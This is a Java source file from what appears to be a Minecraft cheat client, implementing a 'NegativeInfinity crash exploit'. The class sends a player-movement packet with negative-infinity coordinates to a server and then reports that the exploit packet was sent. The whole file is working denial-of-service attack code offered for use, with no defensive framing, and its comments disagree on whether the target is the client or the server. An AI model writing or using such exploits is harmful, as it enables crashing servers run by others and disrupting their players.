package net.paradise_client.exploit.impl;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.paradise_client.*;
import net.paradise_client.exploit.Exploit;

/**
 * This class represents a specific exploit that sends a packet with negative infinity coordinates to crash the client.
 * It extends the Exploit class and overrides the execute method to perform the exploit.
 *
 * @author SpigotRCE
 * @since 2.13
 */
public class NegativeInfinityExploit extends Exploit {

  /**
   * Constructs a new instance of NegativeInfinityExploit with the given name and description.
   */
  public NegativeInfinityExploit(MinecraftClient minecraftClient) {
    super("negativeinfinity", "NegativeInfinity crash exploit", minecraftClient);
  }

  /**
   * Executes the exploit by sending a packet with negative infinity coordinates to the server. After sending the
   * packet, it disables the exploit module and prints a chat message indicating that the exploit packet has been sent.
   */
  @Override public void execute() {
    Helper.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY,
      Double.NEGATIVE_INFINITY,
      Double.NEGATIVE_INFINITY,
      true,
      false));
    ParadiseClient.EXPLOIT_MOD.isRunning = false;
    Helper.printChatMessage("[PlayerMoveNegativeInfinity] Exploit packet sent");
  }
}
